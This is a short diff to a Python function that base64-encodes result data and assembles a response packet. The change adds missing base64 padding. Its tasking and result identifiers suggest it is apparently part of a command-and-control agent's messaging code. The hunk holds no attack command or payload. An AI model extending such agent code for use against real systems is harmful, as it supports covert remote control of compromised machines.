@@ -137,6 +137,9 @@ def build_response_packet(taskingID, packetData, resultID=0):
     
     if packetData:
         packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8',errors='ignore'))
+        if len(packetData) % 4:
+            packetData += '=' * (4 - len(packetData) % 4)
+            
         length = struct.pack('=L',len(packetData))
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
